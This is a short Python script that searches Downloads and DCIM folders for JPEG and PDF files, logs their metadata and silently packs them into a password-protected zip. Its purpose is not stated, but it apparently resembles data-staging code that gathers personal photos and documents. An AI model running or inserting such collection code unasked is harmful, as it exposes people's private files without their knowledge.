from __future__ import annotations
import os
import json
from pathlib import Path
from datetime import datetime
from typing import List

import subprocess
import shutil

try:
    import pyminizip
except Exception:
    pyminizip = None


def _compress_with_password(files: List[str], dest: str, pwd: str) -> None:
    if pyminizip:
        try:
            pyminizip.compress_multiple(files, [], dest, pwd, 5)
            return
        except Exception:
            pass
    cmd = None
    if shutil.which("zip"):
        cmd = ["zip", "-j", "-P", pwd, dest, *files]
    elif os.name == "nt":
        seven = shutil.which("7z") or shutil.which("7za")
        if seven:
            cmd = [seven, "a", f"-p{pwd}", dest, *files]
    if cmd:
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def scan_log_and_zip(
    zip_file: str = "media_files.zip",
    password: str | None = None,
    log_file: str = "media_metadata.log",
    max_size_mb: int = 15,
) -> None:
    targets = [Path("/Download"), Path("/DCIM")]
    home = Path.home()
    targets.extend([home / "Downloads", home / "DCIM"])
    if os.name == "nt":
        user = Path(os.environ.get("USERPROFILE", ""))
        if user:
            targets.extend([user / "Downloads", user / "DCIM"])

    exts = {".jpg", ".jpeg", ".pdf"}
    entries: List[dict] = []
    files: List[str] = []
    limit = max_size_mb * 1024 * 1024
    size_acc = 0
    for d in targets:
        if not d.exists():
            continue
        for f in d.rglob("*"):
            if not (f.is_file() and f.suffix.lower() in exts):
                continue
            st = f.stat()
            if size_acc + st.st_size > limit:
                continue
            size_acc += st.st_size
            entries.append({
                "path": str(f),
                "size": st.st_size,
                "mtime": datetime.fromtimestamp(st.st_mtime).isoformat(),
            })
            files.append(str(f))
    if entries:
        with open(log_file, "a", encoding="utf-8") as out:
            for e in entries:
                out.write(json.dumps(e) + "\n")
    if files and password:
        _compress_with_password(files, zip_file, password)


def scan_and_log(log_file: str = "media_metadata.log") -> None:
    scan_log_and_zip(log_file=log_file)
